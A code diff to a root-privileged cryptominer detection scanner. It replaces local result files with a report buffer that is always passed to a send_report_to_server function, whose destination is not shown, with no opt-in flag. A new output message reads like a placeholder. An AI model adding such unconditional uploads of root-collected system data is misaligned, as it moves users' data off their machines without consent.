@@ -1,6 +1,7 @@
 import os
 import sys
 import argparse
+from io import StringIO
 
 from sys import platform
 from cli.processes_logs_scanner import (
@@ -15,6 +16,7 @@ from cli.processes_logs_scanner import (
     LOG_FILES,
 )
 
+from cli.util import send_report_to_server
 
 def main():
     """
@@ -23,9 +25,6 @@ def main():
     parser = argparse.ArgumentParser(
         description="CLI Scanner for Miners Detection.",
         epilog="Example usage: python scanner.py results.txt -d /home/user -t 24h",
-    )
-    parser.add_argument(
-        "-f", "--file", help="File to save results into.", default="scan_results.txt"
     )
     parser.add_argument("--logs", help="Logs directory to scan.")
     parser.add_argument(
@@ -57,9 +56,7 @@ def main():
     url = args.url
     js = args.js
 
-    write_file = open(
-        args.file, "a", encoding="utf8"
-    )  # append (writes at the end, creates file if needed)
+    report_buffer = StringIO()
 
     if os.geteuid() != 0:
         print(
@@ -68,26 +65,26 @@ def main():
         sys.exit(1)
 
     if proc:
-        processes_scan(write_file)
+        processes_scan(report_buffer)
 
     if cpu:
-        scan_cpu(write_file)
+        scan_cpu(report_buffer)
 
     if gpu:
-        scan_gpu(write_file)
+        scan_gpu(report_buffer)
 
     if network:
         active_hosts = discover_active_hosts(network)
         if active_hosts:
-            scan_hosts_for_miner_ports(active_hosts)
+            scan_hosts_for_miner_ports(active_hosts, report_buffer)
         else:
             print("No active hosts found.")
 
     if url:
-        scan_url(url, write_file)
+        scan_url(url, report_buffer)
 
     if js:
-        scan_js(js, write_file)
+        scan_js(js, report_buffer)
 
     if platform == "darwin":
         LOG_FILES.extend(
@@ -118,12 +115,13 @@ def main():
             print(f"Provided logs directory {logs} is not a valid directory.")
             sys.exit(1)
 
-    logs_scan(write_file, time=time)
-
-    write_file.close()
-    print(f"Results are written inside: {args.file}")
+    logs_scan(report_buffer, time=time)
+    print(f"Results are shown: web server name")
     print("Scan complete.")
 
+    report_text = report_buffer.getvalue()
+    send_report_to_server(report_text)
+    report_buffer.close()
 
 if __name__ == "__main__":
     main()
